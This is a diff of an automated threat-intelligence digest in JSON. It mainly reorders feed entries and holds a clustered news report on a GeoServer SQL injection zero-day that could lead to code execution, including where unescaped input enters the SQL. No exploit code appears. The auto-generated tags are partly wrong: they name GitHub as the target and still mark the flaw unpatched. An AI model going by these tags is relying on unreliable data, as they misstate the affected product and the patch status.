@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-08-19T06:54:16.158755+00:00",
+  "generated_at": "2026-08-19T07:44:36.240984+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
-  "feeds_ok": 74,
-  "total_items_in_window": 315,
+  "feeds_ok": 73,
+  "total_items_in_window": 299,
   "total_clusters_raw": 143,
-  "total_clusters_in_packet": 66,
-  "dropped_low_score": 77,
+  "total_clusters_in_packet": 65,
+  "dropped_low_score": 78,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -74,19 +74,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+    "Unit 42": {
+      "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+      "item_count": 15,
+      "in_window_count": 1
     },
     "Microsoft Security Blog": {
       "url": "https://www.microsoft.com/en-us/security/blog/feed/",
@@ -95,6 +88,13 @@
       "item_count": 10,
       "in_window_count": 1
     },
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
@@ -102,12 +102,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Unit 42": {
-      "url": "https://unit42.paloaltonetworks.com/feed/",
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
+      "item_count": 10,
+      "in_window_count": 0
     },
     "Trend Micro Research": {
       "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
@@ -116,18 +116,25 @@
       "item_count": 25,
       "in_window_count": 0
     },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "NCSC UK": {
       "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
       "cohort": "government_authoritative",
       "status": "ok",
       "item_count": 20,
+      "in_window_count": 2
+    },
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 2
     },
     "Citizen Lab": {
@@ -151,33 +158,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Cisco Talos": {
-      "url": "https://feeds.feedburner.com/feedburner/Talos",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
-    },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 4
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 3
-    },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
     },
     "Horizon3 Attack Research": {
       "url": "https://horizon3.ai/feed/",
@@ -186,11 +172,32 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
+    "Cisco Talos": {
+      "url": "https://feeds.feedburner.com/feedburner/Talos",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 40,
+      "item_count": 15,
+      "in_window_count": 2
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "GitHub Security Lab": {
@@ -200,25 +207,18 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 16
+      "in_window_count": 3
     },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
       "cohort": "offensive_vulnerability_research",
-      "status": "parse_error",
-      "item_count": 0,
+      "status": "ok",
+      "item_count": 40,
       "in_window_count": 0
     },
     "watchTowr Labs": {
@@ -227,6 +227,13 @@
       "status": "ok",
       "item_count": 15,
       "in_window_count": 1
+    },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "The DFIR Report": {
       "url": "https://thedfirreport.com/feed/",
@@ -242,12 +249,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 2
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -256,18 +263,11 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 2
-    },
-    "Elastic Security Labs": {
-      "url": "https://www.elastic.co/security-labs/rss/feed.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 20,
       "in_window_count": 0
     },
     "Sophos X-Ops": {
@@ -276,6 +276,13 @@
       "status": "ok",
       "item_count": 15,
       "in_window_count": 1
+    },
+    "Elastic Security Labs": {
+      "url": "https://www.elastic.co/security-labs/rss/feed.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
     },
     "SpecterOps": {
       "url": "https://medium.com/feed/specter-ops-posts",
@@ -298,30 +305,9 @@
       "item_count": 10,
       "in_window_count": 9
     },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 6
-    },
     "AWS Security Blog": {
       "url": "https://aws.amazon.com/blogs/security/feed/",
       "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 5
-    },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 5
@@ -333,12 +319,40 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 5
+    },
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 6
+    },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
     "Google Cloud Threat Intelligence": {
       "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
     },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
@@ -354,27 +368,6 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
-    "Wiz Research": {
-      "url": "https://www.wiz.io/feed/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 8
-    },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
       "cohort": "cloud_identity_infrastructure",
@@ -388,6 +381,13 @@
       "status": "ok",
       "item_count": 100,
       "in_window_count": 2
+    },
+    "Wiz Research": {
+      "url": "https://www.wiz.io/feed/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 8
     },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
@@ -410,20 +410,6 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 7
-    },
-    "Interconnects": {
-      "url": "https://www.interconnects.ai/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
-    },
     "The Record": {
       "url": "https://therecord.media/feed",
       "cohort": "cyber_news_breach_reporting",
@@ -438,12 +424,19 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "SecurityWeek": {
-      "url": "https://www.securityweek.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "Interconnects": {
+      "url": "https://www.interconnects.ai/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 20,
+      "in_window_count": 3
+    },
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 7
     },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
@@ -452,33 +445,19 @@
       "item_count": 100,
       "in_window_count": 2
     },
+    "SecurityWeek": {
+      "url": "https://www.securityweek.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 9
-    },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 16
-    },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
     },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
@@ -487,6 +466,27 @@
       "item_count": 50,
       "in_window_count": 22
     },
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 16
+    },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
       "cohort": "ransomware_ecrime_financial_crime",
@@ -494,19 +494,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 7
-    },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 2
+    },
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 7
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
@@ -522,6 +522,13 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "Krebs on Security": {
       "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
@@ -529,8 +536,8 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -543,19 +550,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Graham Cluley": {
       "url": "https://grahamcluley.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 2
+      "in_window_count": 3
+    },
+    "Intel 471": {
+      "url": "https://intel471.com/blog/feed",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
     },
     "Reddit r/AskNetsec": {
       "url": "https://www.reddit.com/r/AskNetsec/.rss",
@@ -569,14 +576,7 @@
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 43
-    },
-    "Intel 471": {
-      "url": "https://intel471.com/blog/feed",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
+      "in_window_count": 42
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -1515,8 +1515,129 @@
       ]
     },
     {
+      "cluster_id": "6f7ebcb535",
+      "priority_score": 17,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ddos",
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "GitHub"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2023-25157",
+          "CVE-2023-25158",
+          "CVE-2024-36401"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "no_patch_yet",
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Hacker News",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE",
+        "link": "https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html",
+        "published": "2026-08-13T18:45:12+00:00",
+        "summary": "A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @",
+        "full_body": "GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE  Ravie Lakshmanan  Aug 13, 2026 Zero-Day / Vulnerability A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @q1uf3ng on X. \"GeoServer jsonArrayContains unauthorized SQL injection, and in the case of the sa [system administrator] database, it's naturally possible to achieve RCE,\" the researcher said. The threat intelligence and exposure management platform said it began to observe exploitation attempts within hours of public disclosure, and that it has seen hundreds of attempts originating from a small pool of IP addresses. \"Currently, we're seeing attackers probe to identify vulnerable systems across the internet, triggering errors and not proceeding further,\" Jake Knott, principal security researcher at watchTowr, told The Hacker News in a statement. \"However, this is unlikely to remain the case for long: GeoServer has a track record of being targeted and exploited at scale, with multiple vulnerabilities listed in CISA's Known Exploited Vulnerabilities catalog. More importantly, under certain configurations, this latest vulnerability could ultimately lead to remote code execution.\" In the absence of a patch, organizations running GeoServer are advised to identify exposed instances, restrict public access, and monitor for a vendor fix. In 2024, a critical security flaw impacting GeoServer GeoTools ( CVE-2024-36401 , CVSS score: 9.8) came under active exploitation to turn compromised devices into DDoS and cryptocurrency mining botnets, and residential proxies. Update GeoServer has released versions 3.0.1 , 2.28.5 , and 2.27.6 to address the critical SQL injection vulnerability, which has now been assigned the GitHub security advisory identifier \"GHSA-mqjf-5f49-2fjh.\" It carries a CVSS score of 9.8 out of 10.0. \"An SQL injection vulnerability has been found when executing OGC Filters with PostGIS DataStore implementation: jsonArrayContains function,\" the project maintainers said in an alert, adding it requires PostGIS 12 or greater with a String or JSON field. \"For PostGIS 12 and greater, jsonArrayContains(<column>, <pointer>, <value>) function writes <value> into generated SQL without escaping.\" The issue impacts the following versions of the Maven package \"org.geotools:gt-jdbc-postgis\" - 35.0 (Fixed in 35.1) >=34.0 (Fixed in 34.5) >=33.1 (Fixed in 33.6) The maintainers also noted that the vulnerability is a regression of CVE-2023-25158 (CVSS score: 9.8), another critical SQL injection vulnerability that was addressed alongside CVE-2023-25157 in February 2023. When reached for comment, Jody Garnett, a project owner at GeoCat, told The Hacker News the vulnerability was a known issue in the GeoTools library and that it has been addressed in the aforementioned three versions of GeoServer. Hadrian has since published additional details of the vulnerability, stating it resides in the GeoTools code responsible for translating Common or Contextual Query Language ( CQL ) filters into SQL for PostGIS-backed datastores. \"An attacker-controlled value is interpolated directly into a PostgreSQL jsonb_path_exists() expression without escaping,\" security researcher Melvin Lammerts said . Specifically, the vulnerable function directly drops a user-supplied value that originates from an HTTP request into an SQL literal with no sanitization and input escaping, thereby opening the door to SQL injection. This, in turn, can be turned into RCE by leveraging Web Feature Service ( WFS ) 1.0, which provides a path where a second PostgreSQL statement executes at the top level of the query. \"If GeoServer connects to PostgreSQL using a superuse",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day",
+            "ddos"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2024-36401",
+            "CVE-2023-25158",
+            "CVE-2023-25157"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "no_patch_yet"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE",
+          "link": "https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html",
+          "published": "2026-08-13T18:45:12+00:00",
+          "summary": "A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day",
+              "ddos"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2024-36401",
+              "CVE-2023-25158",
+              "CVE-2023-25157"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "no_patch_yet"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "08eea4e588",
-      "priority_score": 18,
+      "priority_score": 17,
       "member_count": 2,
       "corroborating_source_count": 2,
       "strong_signals": [
@@ -1641,127 +1762,6 @@
             "confidence_tier": "tier_2_operator",
             "role_map": {
               "Microsoft Entra": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "6f7ebcb535",
-      "priority_score": 17,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ddos",
-          "zero_day"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [
-          "GitHub"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2023-25157",
-          "CVE-2023-25158",
-          "CVE-2024-36401"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Hacker News",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE",
-        "link": "https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html",
-        "published": "2026-08-13T18:45:12+00:00",
-        "summary": "A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @",
-        "full_body": "GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE  Ravie Lakshmanan  Aug 13, 2026 Zero-Day / Vulnerability A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @q1uf3ng on X. \"GeoServer jsonArrayContains unauthorized SQL injection, and in the case of the sa [system administrator] database, it's naturally possible to achieve RCE,\" the researcher said. The threat intelligence and exposure management platform said it began to observe exploitation attempts within hours of public disclosure, and that it has seen hundreds of attempts originating from a small pool of IP addresses. \"Currently, we're seeing attackers probe to identify vulnerable systems across the internet, triggering errors and not proceeding further,\" Jake Knott, principal security researcher at watchTowr, told The Hacker News in a statement. \"However, this is unlikely to remain the case for long: GeoServer has a track record of being targeted and exploited at scale, with multiple vulnerabilities listed in CISA's Known Exploited Vulnerabilities catalog. More importantly, under certain configurations, this latest vulnerability could ultimately lead to remote code execution.\" In the absence of a patch, organizations running GeoServer are advised to identify exposed instances, restrict public access, and monitor for a vendor fix. In 2024, a critical security flaw impacting GeoServer GeoTools ( CVE-2024-36401 , CVSS score: 9.8) came under active exploitation to turn compromised devices into DDoS and cryptocurrency mining botnets, and residential proxies. Update GeoServer has released versions 3.0.1 , 2.28.5 , and 2.27.6 to address the critical SQL injection vulnerability, which has now been assigned the GitHub security advisory identifier \"GHSA-mqjf-5f49-2fjh.\" It carries a CVSS score of 9.8 out of 10.0. \"An SQL injection vulnerability has been found when executing OGC Filters with PostGIS DataStore implementation: jsonArrayContains function,\" the project maintainers said in an alert, adding it requires PostGIS 12 or greater with a String or JSON field. \"For PostGIS 12 and greater, jsonArrayContains(<column>, <pointer>, <value>) function writes <value> into generated SQL without escaping.\" The issue impacts the following versions of the Maven package \"org.geotools:gt-jdbc-postgis\" - 35.0 (Fixed in 35.1) >=34.0 (Fixed in 34.5) >=33.1 (Fixed in 33.6) The maintainers also noted that the vulnerability is a regression of CVE-2023-25158 (CVSS score: 9.8), another critical SQL injection vulnerability that was addressed alongside CVE-2023-25157 in February 2023. When reached for comment, Jody Garnett, a project owner at GeoCat, told The Hacker News the vulnerability was a known issue in the GeoTools library and that it has been addressed in the aforementioned three versions of GeoServer. Hadrian has since published additional details of the vulnerability, stating it resides in the GeoTools code responsible for translating Common or Contextual Query Language ( CQL ) filters into SQL for PostGIS-backed datastores. \"An attacker-controlled value is interpolated directly into a PostgreSQL jsonb_path_exists() expression without escaping,\" security researcher Melvin Lammerts said . Specifically, the vulnerable function directly drops a user-supplied value that originates from an HTTP request into an SQL literal with no sanitization and input escaping, thereby opening the door to SQL injection. This, in turn, can be turned into RCE by leveraging Web Feature Service ( WFS ) 1.0, which provides a path where a second PostgreSQL statement executes at the top level of the query. \"If GeoServer connects to PostgreSQL using a superuse",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "zero_day",
-            "ddos"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services"
-          ],
-          "affected_products": [
-            "GitHub"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2024-36401",
-            "CVE-2023-25158",
-            "CVE-2023-25157"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE",
-          "link": "https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html",
-          "published": "2026-08-13T18:45:12+00:00",
-          "summary": "A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @",
-          "taxonomy": {
-            "threat_categories": [
-              "zero_day",
-              "ddos"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services"
-            ],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2024-36401",
-              "CVE-2023-25158",
-              "CVE-2023-25157"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "GitHub": "target"
             },
             "weak_tags": {
               "products": []
@@ -2056,7 +2056,7 @@
         "link": "https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/",
         "published": "2026-08-18T10:32:16+00:00",
         "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. [...]",
